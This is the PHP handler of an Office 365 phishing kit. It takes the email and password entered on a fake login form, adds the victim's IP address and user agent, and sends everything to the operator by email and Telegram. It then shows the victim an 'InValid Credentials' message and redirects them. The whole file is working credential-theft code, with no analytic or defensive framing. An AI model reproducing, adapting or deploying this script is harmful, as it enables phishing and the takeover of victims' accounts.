<?php
include 'email.php';
require("config.php");
include('me.php');
$email = trim($_POST['ai']);
$password = trim($_POST['pr']);

if($email != null && $password != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "NEW OFFICE365 📥\n";
	
	$message .= "User       : ".$email."\n";
	$message .= "Password   : ".$password."\n";
	$message .= "---------------------------------------------\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "Country : ".$country."\n\n";
	$message .= "--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "---------------------------------------------\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
    mail($send, $subject, $message);
	mail($send,$subject,$message,$headers);
    send_telegram_msg($message);  
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);

?>